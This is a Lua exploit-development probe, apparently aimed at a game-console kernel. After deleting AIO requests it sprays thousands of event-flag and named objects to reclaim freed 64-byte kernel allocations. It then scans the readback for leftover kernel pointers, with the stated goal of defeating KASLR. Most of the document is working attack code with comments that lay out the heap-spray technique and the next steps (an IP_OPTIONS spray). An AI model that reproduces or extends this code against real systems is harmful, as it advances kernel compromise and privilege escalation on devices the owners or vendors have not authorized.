-- CRASH_CLASS: MODERATE
-- PROBE 69h: High-volume evf/namedobj spray after AIO delete
--
-- After 662 deletes 16 AIO requests, freed R objects (48B in 64B UMA bucket)
-- retain kernel pointers at R+0x00 (curthread+0x390) and R+0x08 (curthread+0x08).
-- These are NOT zeroed before uma_zfree (13.60 verification).
--
-- This probe sprays 4096 evf and 2048 namedobj objects hoping to reclaim the
-- freed R slots in the same 64B UMA bucket. Reads back via evf_poll (543)
-- and evf_open (540) checking for residual kernel pointers.
--
-- Key question: Do evf/namedobj allocations land in R's 64B UMA zone?
-- If not, probe 69l measures sizes; IP_OPTIONS setsockopt is alternate spray.
--
-- NEVER call 670 (aio_init) -- poisons the delete path.

print("=== PROBE 69h: HIGH-VOLUME EVF/NAMEDOBJ SPRAY ===")
print("")

-- Standard helpers
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

-- Additional helpers
local Z = uint64(0)
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(buf, s)
    for i = 1, #s do
        pcall(function() memory.write_byte(buf + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(buf + #s, 0) end)
end
local function call6(sc, a, b, c, d, e, f)
    local ok, rv = pcall(function() return sc(a, b, c, d, e, f) end)
    if not ok then return nil end
    local h, l = get_hi_lo(rv)
    l = N(l)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

-- Pre-create syscall handles (avoid re-creating per call)
local sc5   = mk(5)    -- open
local sc6   = mk(6)    -- close
local sc20  = mk(20)   -- getpid
local sc416 = mk(416)  -- sigaction
local sc538 = mk(538)  -- evf_create
local sc539 = mk(539)  -- evf_delete
local sc540 = mk(540)  -- evf_open (lookup)
local sc541 = mk(541)  -- evf_close
local sc543 = mk(543)  -- evf_poll
local sc557 = mk(557)  -- namedobj_create
local sc558 = mk(558)  -- namedobj_delete
local sc624 = mk(624)  -- VM op counter
local sc662 = mk(662)  -- AIO delete
local sc664 = mk(664)  -- AIO poll
local sc669 = mk(669)  -- AIO submit

-- ============================================================
-- [A] SETUP
-- ============================================================
print("[A] Setup")

-- Ignore SIGSYS (12), SIGSEGV (11), SIGPIPE (13)
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
wd(N(sa_buf) + 8, 0)
wq(N(sa_buf) + 16, Z)
pcall(function() sc416(uint64(11), sa_buf, Z) end)
pcall(function() sc416(uint64(12), sa_buf, Z) end)
pcall(function() sc416(uint64(13), sa_buf, Z) end)

local pid = N(sc20())
print("pid=" .. pid)

-- Open /dev/zero for AIO
local zero_path = memory.alloc(16)
put_str(N(zero_path), "/dev/zero")
local ok_z, zfd_v = pcall(function() return sc5(uint64(N(zero_path)), Z) end)
local zfd = ok_z and sgn(zfd_v) or -1
print("zero_fd=" .. zfd)
if zfd < 0 then print("FATAL: cannot open /dev/zero"); return end

-- ============================================================
-- [B] SYS 624 ORACLE BASELINE
-- Each mmap adds +5. Zone allocs may or may not trigger VM ops.
-- ============================================================
print("")
print("[B] Sys 624 oracle baseline")
local ok_ob, base_624_v = pcall(function() return sc624() end)
local base_624 = ok_ob and N(base_624_v) or -1
print("624_baseline=" .. base_624)

-- ============================================================
-- [C] BASELINE EVF POLL TEST
-- Create one evf, poll it, see what normal output looks like.
-- This establishes what evf_poll writes for a fresh object.
-- ============================================================
print("")
print("[C] Baseline evf poll test")

local name_buf = memory.alloc(32)
put_str(N(name_buf), "base_evf_test")
local base_evf = call6(sc538, uint64(N(name_buf)), uint64(0x100), Z, Z, Z, Z)
print("baseline_evf_handle=" .. (base_evf or "nil"))

local poll_out = memory.alloc(64)

if base_evf and base_evf > 0 then
    -- Poll with pattern 0xFFFFFFFF, mode 0 (OR)
    -- Output goes to arg4 (matching 336a pattern)
    for off = 0, 56, 8 do wq(N(poll_out) + off, uint64(0xDEADDEAD)) end

    local pr = call6(sc543, uint64(base_evf), uint64(0xFFFFFFFF), Z,
                     uint64(N(poll_out)), Z, Z)
    print("poll_ret=" .. (pr or "nil"))
    print("poll_out[0]=" .. fmt(rq(N(poll_out))))
    print("poll_out[8]=" .. fmt(rq(N(poll_out) + 8)))
    print("poll_out[16]=" .. fmt(rq(N(poll_out) + 16)))

    -- Also try mode=1 (AND)
    for off = 0, 56, 8 do wq(N(poll_out) + off, uint64(0xBEEFBEEF)) end
    local pr2 = call6(sc543, uint64(base_evf), uint64(0xFFFFFFFF), uint64(1),
                      uint64(N(poll_out)), Z, Z)
    print("poll_mode1_ret=" .. (pr2 or "nil"))
    print("poll_mode1_out[0]=" .. fmt(rq(N(poll_out))))

    -- Delete baseline evf
    pcall(function() sc539(uint64(base_evf), Z, Z, Z, Z, Z) end)
end

-- ============================================================
-- [D] AIO SUBMIT 16 REQUESTS INDIVIDUALLY
-- Each submit allocates R (48B), I (88B), Q (88B), A (48B)
-- in kernel. R is in the 64B UMA bucket.
-- ============================================================
print("")
print("[D] AIO submit 16 requests")

local AIO_COUNT = 16
local data_buf = memory.alloc(0x4000)   -- read destination (16KB)
local result_buf = memory.alloc(0x100)  -- result word output
local req_buf = memory.alloc(0x30)      -- single request struct (0x28 bytes)
local id_out = memory.alloc(8)          -- single ID output

-- Fill request struct template (reused for each submit)
-- Layout: +0x00 offset(8) +0x08 length(8) +0x10 data_ptr(8) +0x18 result_ptr(8) +0x20 fd(4) +0x24 pad(4)
wq(N(req_buf) + 0x00, Z)                        -- offset = 0
wq(N(req_buf) + 0x08, uint64(0x4000))            -- length = 16KB
local bh, bl = get_hi_lo(uint64(N(data_buf)))
wd(N(req_buf) + 0x10, N(bl)); wd(N(req_buf) + 0x14, N(bh))
local rh, rl = get_hi_lo(uint64(N(result_buf)))
wd(N(req_buf) + 0x18, N(rl)); wd(N(req_buf) + 0x1C, N(rh))
wd(N(req_buf) + 0x20, zfd); wd(N(req_buf) + 0x24, 0)

local aio_ids = memory.alloc(4 * AIO_COUNT + 8)
local submitted = 0

for i = 0, AIO_COUNT - 1 do
    wd(N(id_out), 0)
    pcall(function()
        sc669(uint64(1), uint64(N(req_buf)), uint64(1), uint64(1), uint64(N(id_out)))
    end)
    local aid = rd(N(id_out)) or 0
    if aid ~= 0 then
        wd(N(aio_ids) + submitted * 4, aid)
        submitted = submitted + 1
    end
end
print("submitted=" .. submitted)

if submitted > 0 then
    local f_id = rd(N(aio_ids)) or 0
    local l_id = rd(N(aio_ids) + (submitted - 1) * 4) or 0
    print(string.format("first_id=0x%X last_id=0x%X", f_id, l_id))
end

-- ============================================================
-- [E] POLL ALL AIO REQUESTS VIA 664
-- ============================================================
print("")
print("[E] Poll AIO requests")
local poll_st = memory.alloc(8)
local polled = 0

for i = 0, submitted - 1 do
    local aid = rd(N(aio_ids) + i * 4) or 0
    if aid ~= 0 then
        wd(N(id_out), aid)
        wd(N(poll_st), 0xDEAD)
        pcall(function()
            sc664(uint64(N(id_out)), uint64(1), uint64(N(poll_st)))
        end)
        local st = rd(N(poll_st)) or 0xDEAD
        if st ~= 0xDEAD then polled = polled + 1 end
    end
end
print("polled=" .. polled)

-- ============================================================
-- [F] DELETE ALL AIO VIA 662 (frees R objects with kernel ptrs)
-- R+0x00 = curthread+0x390, R+0x08 = curthread+0x08
-- Only R+0x10 is zeroed. Kernel pointers survive in zone free list.
-- ============================================================
print("")
print("[F] Delete all AIO (freeing R objects)")

local del_states = memory.alloc(4 * AIO_COUNT + 8)
for i = 0, AIO_COUNT - 1 do wd(N(del_states) + i * 4, 0xDD) end

pcall(function()
    sc662(uint64(N(aio_ids)), uint64(submitted), uint64(N(del_states)))
end)

local del_ok = 0
for i = 0, submitted - 1 do
    local st = rd(N(del_states) + i * 4) or 0xDD
    if st == 0 then del_ok = del_ok + 1 end
end
print("deleted=" .. del_ok .. "/" .. submitted)

-- Oracle after delete
local ok_od, pd_v = pcall(function() return sc624() end)
local post_del_624 = ok_od and N(pd_v) or -1
print("624_after_delete=" .. post_del_624 .. " (delta=" .. (post_del_624 - base_624) .. ")")

-- ============================================================
-- [G] EVF SPRAY: 4096 objects via 538(name, 0x100)
-- attr=0x100 registers by name in the shared registry.
-- Each evf_create allocates a kernel evf object from its UMA zone.
-- If evf objects share R's 64B bucket, some will reclaim R's memory.
-- ============================================================
print("")
print("[G] EVF spray: 4096 objects")

local EVF_COUNT = 4096
local evf_handles = memory.alloc(4 * EVF_COUNT + 16)
for i = 0, EVF_COUNT - 1 do wd(N(evf_handles) + i * 4, 0) end

-- Pre-write name template "evf_0000\0"
put_str(N(name_buf), "evf_0000")

local evf_ok = 0
local evf_fail = 0

for i = 0, EVF_COUNT - 1 do
    -- Update 4-digit suffix at offsets 4,5,6,7; NUL at 8
    local d3 = math.floor(i / 1000) % 10
    local d2 = math.floor(i / 100) % 10
    local d1 = math.floor(i / 10) % 10
    local d0 = i % 10
    pcall(function() memory.write_byte(N(name_buf) + 4, 0x30 + d3) end)
    pcall(function() memory.write_byte(N(name_buf) + 5, 0x30 + d2) end)
    pcall(function() memory.write_byte(N(name_buf) + 6, 0x30 + d1) end)
    pcall(function() memory.write_byte(N(name_buf) + 7, 0x30 + d0) end)
    pcall(function() memory.write_byte(N(name_buf) + 8, 0) end)

    local h = call6(sc538, uint64(N(name_buf)), uint64(0x100), Z, Z, Z, Z)
    if h and h > 0 then
        wd(N(evf_handles) + evf_ok * 4, h)
        evf_ok = evf_ok + 1
    else
        evf_fail = evf_fail + 1
        if evf_fail <= 3 then
            print(string.format("  evf[%d] FAIL ret=%s", i, tostring(h)))
        end
        if evf_fail == 3 then print("  (suppressing further evf failures)") end
        if evf_fail > 100 and evf_ok == 0 then
            print("  ABORT: evf creation consistently failing")
            break
        end
    end

    if (i + 1) % 1000 == 0 then
        print(string.format("  evf: %d/%d ok=%d fail=%d", i + 1, EVF_COUNT, evf_ok, evf_fail))
    end
end
print(string.format("evf_created=%d evf_failed=%d", evf_ok, evf_fail))

if evf_ok > 0 then
    local fh = rd(N(evf_handles)) or 0
    local lh = rd(N(evf_handles) + (evf_ok - 1) * 4) or 0
    print(string.format("first_handle=0x%X last_handle=0x%X", fh, lh))
    -- Decode slot/generation for first and last
    local f_slot = fh % 8192; local f_gen = math.floor(fh / 8192)
    local l_slot = lh % 8192; local l_gen = math.floor(lh / 8192)
    print(string.format("first: slot=%d gen=%d  last: slot=%d gen=%d", f_slot, f_gen, l_slot, l_gen))
end

-- Oracle after evf spray
local ok_oe, pe_v = pcall(function() return sc624() end)
local post_evf_624 = ok_oe and N(pe_v) or -1
print("624_after_evf=" .. post_evf_624 .. " (delta_from_delete=" .. (post_evf_624 - post_del_624) .. ")")

-- ============================================================
-- [H] NAMEDOBJ SPRAY: 2048 objects via 557(name)
-- namedobj_create returns a new handle per call regardless of
-- name (proven 254a). Different kernel object type, might have
-- different allocation size. Testing if it fits 64B bucket.
-- ============================================================
print("")
print("[H] Namedobj spray: 2048 objects")

local NO_COUNT = 2048
local no_handles = memory.alloc(4 * NO_COUNT + 16)
for i = 0, NO_COUNT - 1 do wd(N(no_handles) + i * 4, 0) end

-- Name template "no_0000\0" (7 chars + NUL)
put_str(N(name_buf), "no_0000")

local no_ok = 0
local no_fail = 0

for i = 0, NO_COUNT - 1 do
    -- Digits at offsets 3,4,5,6; NUL at 7
    local d3 = math.floor(i / 1000) % 10
    local d2 = math.floor(i / 100) % 10
    local d1 = math.floor(i / 10) % 10
    local d0 = i % 10
    pcall(function() memory.write_byte(N(name_buf) + 3, 0x30 + d3) end)
    pcall(function() memory.write_byte(N(name_buf) + 4, 0x30 + d2) end)
    pcall(function() memory.write_byte(N(name_buf) + 5, 0x30 + d1) end)
    pcall(function() memory.write_byte(N(name_buf) + 6, 0x30 + d0) end)
    pcall(function() memory.write_byte(N(name_buf) + 7, 0) end)

    local h = call6(sc557, uint64(N(name_buf)), Z, Z, Z, Z, Z)
    if h and h > 0 then
        wd(N(no_handles) + no_ok * 4, h)
        no_ok = no_ok + 1
    else
        no_fail = no_fail + 1
        if no_fail <= 3 then
            print(string.format("  namedobj[%d] FAIL ret=%s", i, tostring(h)))
        end
        if no_fail == 3 then print("  (suppressing further namedobj failures)") end
        if no_fail > 100 and no_ok == 0 then
            print("  ABORT: namedobj creation consistently failing")
            break
        end
    end

    if (i + 1) % 500 == 0 then
        print(string.format("  namedobj: %d/%d ok=%d fail=%d", i + 1, NO_COUNT, no_ok, no_fail))
    end
end
print(string.format("no_created=%d no_failed=%d", no_ok, no_fail))

-- Oracle after namedobj spray
local ok_on, pn_v = pcall(function() return sc624() end)
local post_no_624 = ok_on and N(pn_v) or -1
print("624_after_namedobj=" .. post_no_624 .. " (delta_from_evf=" .. (post_no_624 - post_evf_624) .. ")")

-- ============================================================
-- [I] READBACK: evf_poll (543) scan ALL evf handles
-- If an evf reclaimed R's memory and the internal pattern field
-- overlaps R+0x00 or R+0x08, the poll output will contain
-- kernel thread pointers instead of zero.
--
-- 543(handle, wait_pattern, mode, result_ptr, ...) writes the
-- current flags to result_ptr. We check all 4 qwords of output.
-- ============================================================
print("")
print("[I] Readback: evf_poll scan (" .. evf_ok .. " handles)")

local kptr_poll = 0
local nonzero_poll = 0

for i = 0, evf_ok - 1 do
    local handle = rd(N(evf_handles) + i * 4) or 0
    if handle > 0 then
        -- Fill output buffer with sentinel
        for off = 0, 56, 8 do
            wq(N(poll_out) + off, uint64(0xDEADDEAD))
        end

        -- Poll: pattern=0xFFFFFFFF, mode=0 (OR), result at poll_out
        pcall(function()
            sc543(uint64(handle), uint64(0xFFFFFFFF), Z,
                  uint64(N(poll_out)), Z, Z)
        end)

        -- Scan output buffer for kernel pointers
        for off = 0, 24, 8 do
            local val = rq(N(poll_out) + off)
            if val then
                local vh, vl = get_hi_lo(val)
                -- Skip unchanged sentinel
                if not (N(vh) == 0xDEADDEAD and N(vl) == 0xDEADDEAD) then
                    if N(vh) ~= 0 or N(vl) ~= 0 then
                        nonzero_poll = nonzero_poll + 1
                        if nonzero_poll <= 20 then
                            print(string.format("  NONZERO evf[%d] h=0x%X off=%d val=%s",
                                i, handle, off, fmt(val)))
                        end
                    end
                    if N(vh) >= 0xFFFF8000 and N(vh) ~= 0xFFFFFFFF then
                        kptr_poll = kptr_poll + 1
                        print(string.format("  *** KPTR *** evf[%d] h=0x%X off=%d val=%s",
                            i, handle, off, fmt(val)))
                    end
                end
            end
        end
    end

    if (i + 1) % 1000 == 0 then
        print(string.format("  poll scan: %d/%d kptrs=%d nonzero=%d",
            i + 1, evf_ok, kptr_poll, nonzero_poll))
    end
end
print(string.format("evf_poll_scan: kptrs=%d nonzero=%d scanned=%d",
    kptr_poll, nonzero_poll, evf_ok))

-- ============================================================
-- [J] READBACK: evf_open (540) handle scan (first 256)
-- 540 returns a handle (gen<<13|slot), which is always a small
-- integer. Unlikely to contain kernel pointers, but check for
-- completeness. Close each opened handle via 541 afterward.
-- ============================================================
print("")
print("[J] Readback: evf_open handle scan (first 256)")

local kptr_open = 0
local LOOKUP_MAX = 256
if LOOKUP_MAX > evf_ok then LOOKUP_MAX = evf_ok end

-- Re-write name template for lookups
put_str(N(name_buf), "evf_0000")

for i = 0, LOOKUP_MAX - 1 do
    local d3 = math.floor(i / 1000) % 10
    local d2 = math.floor(i / 100) % 10
    local d1 = math.floor(i / 10) % 10
    local d0 = i % 10
    pcall(function() memory.write_byte(N(name_buf) + 4, 0x30 + d3) end)
    pcall(function() memory.write_byte(N(name_buf) + 5, 0x30 + d2) end)
    pcall(function() memory.write_byte(N(name_buf) + 6, 0x30 + d1) end)
    pcall(function() memory.write_byte(N(name_buf) + 7, 0x30 + d0) end)
    pcall(function() memory.write_byte(N(name_buf) + 8, 0) end)

    local ok_l, rv_l = pcall(function()
        return sc540(uint64(N(name_buf)), Z, Z, Z, Z, Z)
    end)
    if ok_l then
        local vh, vl = get_hi_lo(rv_l)
        if N(vh) >= 0xFFFF8000 and N(vh) ~= 0xFFFFFFFF then
            kptr_open = kptr_open + 1
            print(string.format("  *** KPTR *** evf_open(%d) = %s", i, fmt(rv_l)))
        end
        -- Close the opened handle to avoid leaking references
        local hval = N(vl)
        if hval > 0 and hval < 0x80000000 then
            pcall(function() sc541(uint64(hval), Z, Z, Z, Z, Z) end)
        end
    end
end
print(string.format("evf_open_scan: kptrs=%d scanned=%d", kptr_open, LOOKUP_MAX))

-- ============================================================
-- [K] NAMEDOBJ HANDLE CHECK
-- Handles are gen<<13|slot (always small integers from the
-- shared object table). Cannot contain kernel pointers by
-- design, but check as a sanity control.
-- ============================================================
print("")
print("[K] Namedobj handle check")

local kptr_no = 0
for i = 0, no_ok - 1 do
    local handle = rd(N(no_handles) + i * 4) or 0
    if handle > 0 then
        local vh, vl = get_hi_lo(uint64(handle))
        if N(vh) >= 0xFFFF8000 and N(vh) ~= 0xFFFFFFFF then
            kptr_no = kptr_no + 1
            print(string.format("  *** KPTR *** namedobj[%d] handle=%s", i, fmt(uint64(handle))))
        end
    end
end
print(string.format("namedobj_handle_scan: kptrs=%d scanned=%d", kptr_no, no_ok))

-- ============================================================
-- [L] SUMMARY
-- ============================================================
print("")
print("=== SUMMARY ===")
print(string.format("AIO: submitted=%d polled=%d deleted=%d", submitted, polled, del_ok))
print(string.format("EVF: created=%d failed=%d", evf_ok, evf_fail))
print(string.format("Namedobj: created=%d failed=%d", no_ok, no_fail))
print(string.format("Kernel pointers: poll=%d open=%d namedobj=%d TOTAL=%d",
    kptr_poll, kptr_open, kptr_no, kptr_poll + kptr_open + kptr_no))
print(string.format("Nonzero poll outputs: %d", nonzero_poll))
print(string.format("624 deltas: baseline_to_delete=%d delete_to_evf=%d evf_to_namedobj=%d",
    post_del_624 - base_624,
    post_evf_624 - post_del_624,
    post_no_624 - post_evf_624))

if kptr_poll + kptr_open + kptr_no > 0 then
    print("")
    print("*** KERNEL POINTER LEAK DETECTED ***")
    print("*** KASLR DEFEAT CANDIDATE ***")
    print("*** R+0x00/R+0x08 residual data survived in spray object ***")
else
    print("")
    print("No kernel pointers found. Likely causes:")
    print("  1. evf/namedobj use a different UMA zone than R (64B bucket)")
    print("  2. Object initializer zeroes all fields including residual data")
    print("  3. evf_poll reads field that does not overlap R+0x00/R+0x08")
    print("  Next: probe 69l to measure evf/namedobj kernel object sizes")
    print("  Next: try IP_OPTIONS setsockopt spray (different alloc path)")
end

-- ============================================================
-- [M] CLEANUP: 539(handle) for evf, 558(handle) for namedobj
-- ============================================================
print("")
print("[M] Cleanup")

local cleaned_evf = 0
for i = 0, evf_ok - 1 do
    local handle = rd(N(evf_handles) + i * 4) or 0
    if handle > 0 then
        pcall(function() sc539(uint64(handle), Z, Z, Z, Z, Z) end)
        cleaned_evf = cleaned_evf + 1
    end
end
print("evf_cleaned=" .. cleaned_evf)

local cleaned_no = 0
for i = 0, no_ok - 1 do
    local handle = rd(N(no_handles) + i * 4) or 0
    if handle > 0 then
        pcall(function() sc558(uint64(handle), Z, Z, Z, Z, Z) end)
        cleaned_no = cleaned_no + 1
    end
end
print("no_cleaned=" .. cleaned_no)

-- Close /dev/zero
pcall(function() sc6(uint64(zfd)) end)

-- Final oracle
local ok_oc, pc_v = pcall(function() return sc624() end)
local post_clean_624 = ok_oc and N(pc_v) or -1
print("624_after_cleanup=" .. post_clean_624 ..
    " (delta_from_spray=" .. (post_clean_624 - post_no_624) .. ")")

print("")
print("alive=YES")
print("=== PROBE 69h COMPLETE ===")
